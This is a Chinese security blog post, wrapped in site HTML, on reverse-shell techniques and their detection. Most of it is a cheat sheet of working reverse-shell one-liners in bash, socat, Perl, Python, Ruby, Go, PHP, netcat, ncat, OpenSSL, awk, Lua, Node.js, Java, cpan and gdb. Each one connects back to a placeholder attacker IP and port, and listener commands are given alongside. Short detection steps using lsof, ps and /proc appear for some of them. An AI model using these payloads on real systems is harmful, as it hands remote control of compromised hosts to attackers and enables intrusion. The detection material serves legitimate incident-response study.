@@ -1,0 +1,450 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>反弹shell的姿势与检测 | Linnco的小站</title><meta name="author" content="lincoxi"><meta name="copyright" content="lincoxi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="开个新坑 最近学的云安全，偏向应急响应和内网渗透 一方面是记录下云安全的学习，另一方面会记录一下应急响应的知识  CWPP 云负载保护平台 集成了主机安全、容器安全、网页防篡改 可以理解为linux下的监控软件  反弹shell和检测 下文出现的attack_ip，attack_port即监听机 用于接收反弹的shell 在RCE后，反弹shell可以帮我们拿下一台主机的权限，为后续渗透利用打下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell的姿势与检测">
+<meta property="og:url" content="https://lincoxi.top/2024/06/10/index.html">
+<meta property="og:site_name" content="Linnco的小站">
+<meta property="og:description" content="开个新坑 最近学的云安全，偏向应急响应和内网渗透 一方面是记录下云安全的学习，另一方面会记录一下应急响应的知识  CWPP 云负载保护平台 集成了主机安全、容器安全、网页防篡改 可以理解为linux下的监控软件  反弹shell和检测 下文出现的attack_ip，attack_port即监听机 用于接收反弹的shell 在RCE后，反弹shell可以帮我们拿下一台主机的权限，为后续渗透利用打下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lincoxi.top/img/tom.WEBP">
+<meta property="article:published_time" content="2024-06-10T15:07:38.000Z">
+<meta property="article:modified_time" content="2024-06-10T15:24:04.707Z">
+<meta property="article:author" content="lincoxi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lincoxi.top/img/tom.WEBP"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lincoxi.top/2024/06/10/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '反弹shell的姿势与检测',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-10 23:24:04'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tom.WEBP" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202404270045369.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Linnco的小站"><span class="site-name">Linnco的小站</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">反弹shell的姿势与检测</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-10T15:07:38.000Z" title="发表于 2024-06-10 23:07:38">2024-06-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-10T15:24:04.707Z" title="更新于 2024-06-10 23:24:04">2024-06-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/06/10/" data-flag-title="反弹shell的姿势与检测"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>开个新坑 最近学的云安全，偏向应急响应和内网渗透</p>
+<p>一方面是记录下云安全的学习，另一方面会记录一下应急响应的知识</p>
+</blockquote>
+<h1 id="CWPP"><a href="#CWPP" class="headerlink" title="CWPP"></a>CWPP</h1><blockquote>
+<p>云负载保护平台</p>
+<p>集成了主机安全、容器安全、网页防篡改</p>
+<p>可以理解为linux下的监控软件</p>
+</blockquote>
+<h1 id="反弹shell和检测"><a href="#反弹shell和检测" class="headerlink" title="反弹shell和检测"></a>反弹shell和检测</h1><blockquote>
+<p>下文出现的attack_ip，attack_port即监听机 用于接收反弹的shell</p>
+<p>在RCE后，反弹shell可以帮我们拿下一台主机的权限，为后续渗透利用打下基础</p>
+</blockquote>
+<p>一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;attack_ip&gt;/&lt;attack_port&gt; 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>bash -i</p>
+<p>bash 一个shell应用</p>
+<p>-i 产生交互式shell</p>
+</li>
+<li><p>>&amp;</p>
+<p>混合输出，将正确的，错误的结果都输出到一个地方——攻击者端</p>
+</li>
+<li><p>/dev/tcp/ip/port</p>
+<p>对该文件读写建立一个socket通信</p>
+</li>
+<li><p>0>&amp;1</p>
+<p>0表示输入，将Attack输入，命令执行结果为1，输出给攻击者，形成回路</p>
+</li>
+</ul>
+<p>如何检测？</p>
+<p>使⽤lsof检测，如果出现了0 1 2 ⽂件描述符的重定位，则存在反弹shell的⻛险</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;0u|1u|2u&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netstat -atnlp</span><br></pre></td></tr></table></figure>
+<h2 id="多种形式"><a href="#多种形式" class="headerlink" title="多种形式"></a>多种形式</h2><h3 id="UDP-shell"><a href="#UDP-shell" class="headerlink" title="UDP shell"></a>UDP shell</h3><p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -u -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure>
+<p>反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/udp/&lt;attack_ip&gt;/&lt;attack_port&gt; 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><blockquote>
+<p>nc加强版</p>
+<p>可以支持众多协议和链接方式 如 IP、TCP、 UDP、</p>
+<p>IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket等</p>
+<p>经过测试 是能够强交互的 能够进行vim之类的操作</p>
+<p>这么多复现下来貌似只有这个能够强交互</p>
+</blockquote>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 TCP-L:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:&lt;attack_ip&gt;:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure>
+<p>ctrl + D 或者logout结束shell</p>
+<p>需要支持的是安装socat</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y socat</span><br></pre></td></tr></table></figure>
+<p>Socat运⾏有4个阶段：</p>
+<ol>
+<li>初始化阶段：将解析命令⾏并初始化⽇志系统。</li>
+<li>打开阶段：Socat打开第⼀个地址连接，然后打开第⼆个地址连接。如果第⼀个连接失败，则会直</li>
+</ol>
+<p>接退出。</p>
+<ol>
+<li>传输阶段：Socat通过CWselect()监视，当数据在⼀侧可⽤并且可以写到另⼀侧时，socat读取它，</li>
+</ol>
+<p>并在需要时执⾏换⾏符转换，然后写⼊将该数据保存到另⼀个流的写⼊⽂件描述符中，然后继续等</p>
+<p>待双向的更多数据。</p>
+<ol>
+<li>关闭阶段：其中⼀个连接掉开，执⾏处理另外⼀个连接。</li>
+</ol>
+<h4 id="检测socat-shell"><a href="#检测socat-shell" class="headerlink" title="检测socat shell"></a>检测socat shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;*u&#x27;</span></span><br><span class="line"><span class="comment">#查看socat进程</span></span><br><span class="line">ps aux|grep socat</span><br><span class="line"><span class="built_in">ls</span> -al /proc/93974/fd <span class="comment">#查看进程号具体信息</span></span><br><span class="line">lsof -n|grep 217744</span><br></pre></td></tr></table></figure>
+<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><p>⽆需安装，很多系统平台上已经默认安装了perl，有⼀些WebShell⼤⻢中会集成Perl反弹Shell这也是最常⻅反弹⼿法之⼀。</p>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure>
+<p>反弹 依赖/bin/sh</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=</span></span><br><span class="line"><span class="string">&quot;&lt;attack_ip&gt;&quot;;$p=&lt;attack_port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>反弹 不依赖</p>
+<blockquote>
+<p>第一个是老版本 我测试下来已经不行了</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;&lt;attack_ip&gt;:&lt;attack_port&gt;&quot;);STDIN-&gt;fdopen($c,r);$~&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>new version！</p>
+<p>收到监听后不会回显主机名之类的</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">&#x27;$p=fork;exit,if($p);$c=IO::Socket::INET-&gt;new(PeerAddr=&gt;&quot;&lt;attack_ip&gt;:&lt;attack_port&gt;&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="检测-Perl-Shell"><a href="#检测-Perl-Shell" class="headerlink" title="检测 Perl Shell"></a>检测 Perl Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;0u|1u|2u&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>正常情况下就是没有，可以对比一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405301546502.png" alt="截屏2024-05-30 15.46.31"></p>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -kf</span><br></pre></td></tr></table></figure>
+<p>反弹 注意python3还是python</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=</span><br><span class="line"><span class="string">&quot;&lt;attack_ip&gt;&quot;</span>;<span class="built_in">export</span> RPORT=&lt;attack_port&gt;;python3 -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>另一种</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;attack_ip&gt;&quot;,&lt;attack_port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -n | grep ESTABLISHED |grep -E <span class="string">&#x27;0u|1u|2u&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><ul>
+<li>安装了Ruby</li>
+<li>Ruby 2.6</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install ruby ruby-devel rubygems rpm-build</span><br></pre></td></tr></table></figure>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;&lt;attack_ip&gt;&quot;,&quot;&lt;attack_port&gt;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;&lt;attack_ip&gt;:&lt;attack_port&gt;&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; <span class="built_in">rm</span> /tmp/t.go</span><br></pre></td></tr></table></figure>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>反弹</p>
+<blockquote>
+<p>失败了</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;attack_ip&gt;&quot;,&lt;attack_port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>第二个</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;attack_ip&gt;&quot;,&lt;attack_port&gt;);$proc=proc_open(&quot;/bin/sh -i&quot;,array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Netcat-Traditional"><a href="#Netcat-Traditional" class="headerlink" title="Netcat Traditional"></a>Netcat Traditional</h2><blockquote>
+<p>现代版本基本ban了</p>
+</blockquote>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp &lt;attack_port&gt; -k</span><br></pre></td></tr></table></figure>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash &lt;attack_ip&gt; &lt;attack_port&gt;</span><br><span class="line">nc -c bash &lt;attack_ip&gt; &lt;attack_port&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br><span class="line"><span class="built_in">ls</span> -al /proc/1882/fd <span class="comment">#看进程</span></span><br></pre></td></tr></table></figure>
+<h2 id="Netcat-OpenBsd"><a href="#Netcat-OpenBsd" class="headerlink" title="Netcat OpenBsd"></a>Netcat OpenBsd</h2><blockquote>
+<p>Netcat OpenBsd使⽤场景，当各个linux发⾏版本已经⾃带了netcat⼯具包，但是可能由于处于安</p>
+<p>全考虑原⽣版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e这⾥都被阉割了。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;attack_ip&gt; &lt;attack_port&gt; &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>mkfifo：创建⼀个管道</p>
+</li>
+<li><p>cat /tmp/f：将管道⾥⾯的内容输出传递给/bin/sh</p>
+</li>
+<li><p>/bin/sh -i 2&gt;&amp;1：sh会执⾏管道⾥的命令并将标准输出和标准错误输出结果通过nc 传到该管道，</p>
+<p>由此形成了⼀个回路</p>
+</li>
+</ul>
+<h2 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h2><blockquote>
+<p>nc和ncat的区别：只是采⽤不同的选项并具有不同的功能。</p>
+<p>但是安装的Ncat有 -e参数了</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat &lt;attack_ip&gt; &lt;attack_port&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>
+<h2 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h2><blockquote>
+<p>常⽤的nc反弹流量都没有经过加密，容易被发现，使⽤ OpenSSL ⽣成证书⾃签名证书，通过mkfifo创</p>
+<p>建⼀个管道将管道⾥⾯的内容输出传递给/bin/sh</p>
+</blockquote>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;attack_port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">ncat --ssl -vv -l -p &lt;attack_port&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>先生成自签名证书</p>
+</blockquote>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;attack_ip&gt;:&lt;attack_port&gt; &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure>
+<h2 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h2><blockquote>
+<p>未成功复现</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s =&quot;/inet/tcp/0/&lt;attack_ip&gt;/&lt;attack_port&gt;&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c !=&quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure>
+<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><blockquote>
+<p>安装luasocket</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;&lt;attack_ip&gt;&#x27;,&#x27;&lt;attack_port&gt;&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -e <span class="string">&#x27;(function()&#123;var net = require(&quot;net&quot;),cp = require(&quot;child_process&quot;),sh = cp.spawn(&quot;/bin/sh&quot;, []);var client = new net.Socket();client.connect(&lt;attack_port&gt;,&quot;&lt;attack_ip&gt;&quot;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim Exec.java</span><br><span class="line">public class Exec &#123;</span><br><span class="line">   public static void main(String[] args)throws Exception &#123;</span><br><span class="line">       Runtime r = Runtime.getRuntime();</span><br><span class="line">       Process p = r.exec(new String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec</span></span><br><span class="line"><span class="string">5&lt;&gt;/dev/tcp/&lt;attack_ip&gt;/&lt;attack_port&gt;;cat &lt;&amp;5 | while read line; do <span class="variable">$line</span> 2&gt;&amp;5</span></span><br><span class="line"><span class="string">&gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">       p.waitFor();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">javac Exec.java</span><br><span class="line">java Exec</span><br></pre></td></tr></table></figure>
+<h2 id="Cpan"><a href="#Cpan" class="headerlink" title="Cpan"></a>Cpan</h2><blockquote>
+<p>cpan 命令是⽤于与Perl下的CPAN模块进⾏交互的⼀个命令⾏⼯具。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cpan use Socket; my <span class="variable">$i</span>= <span class="string">&quot;&lt;attack_ip&gt;&quot;</span>; my <span class="variable">$p</span>=&lt;attack_port&gt;; socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>)); <span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN, <span class="string">&quot;&gt;&amp;S&quot;</span>); open(STDOUT, <span class="string">&quot;&gt;&amp;S&quot;</span>); open(STDERR, <span class="string">&quot;&gt;&amp;S&quot;</span>); <span class="built_in">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex <span class="string">&#x27;python import sys,socket,os,pty; s=socket.socket(); s.connect((&quot;&lt;attack_ip&gt;&quot;, &lt;attack_port&gt;)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span> -ex quitx</span><br></pre></td></tr></table></figure>
